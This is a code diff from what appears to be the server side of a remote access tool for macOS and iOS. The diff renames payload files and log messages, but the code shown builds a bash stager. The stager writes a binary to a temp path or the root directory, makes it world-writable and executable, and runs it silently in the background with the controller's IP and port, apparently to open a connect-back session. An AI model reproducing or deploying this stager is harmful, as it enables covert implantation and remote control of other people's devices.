@@ -107,26 +107,26 @@ class Server:
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
             self.verbose_print("Detected macOS")
-            f = open("resources/mplmacos", "rb")
+            f = open("resources/macos", "rb")
             payload = f.read()
             f.close()
             #save to tmp, 
             instructions = \
-            "cat >/private/tmp/tmpmpl;"+\
-            "chmod 777 /private/tmp/tmpmpl;"+\
-            "mv /private/tmp/tmpmpl /private/tmp/mpl;"+\
-            "/private/tmp/mpl "+payload_parameter+" 2>/dev/null &\n"
+            "cat >/private/tmp/tmpm;"+\
+            "chmod 777 /private/tmp/tmpm;"+\
+            "mv /private/tmp/tmpm /private/tmp/m;"+\
+            "/private/tmp/m "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Detected iOS")
-            f = open("resources/mplios", "rb")
+            f = open("resources/ios", "rb")
             payload = f.read()
             f.close()
             instructions = \
-            "cat >/tmp/tmpmpl;"+\
-            "chmod 777 /tmp/tmpmpl;"+\
-            "mv /tmp/tmpmpl /.mpl;"+\
-            "/.mpl "+payload_parameter+" 2>/dev/null &\n"
+            "cat >/tmp/tmpm;"+\
+            "chmod 777 /tmp/tmpm;"+\
+            "mv /tmp/tmpm /.m;"+\
+            "/.m "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
@@ -162,12 +162,12 @@ class Server:
         except Exception as e:
             raw_input("Press enter to continue...")
             return
-        self.verbose_print("Sending MPL Payload...")
+        self.verbose_print("Sending Mouse Payload...")
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
 
         # send executable
-        self.debug_print("Sending MPL Executable...")
+        self.debug_print("Sending Mouse Executable...")
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
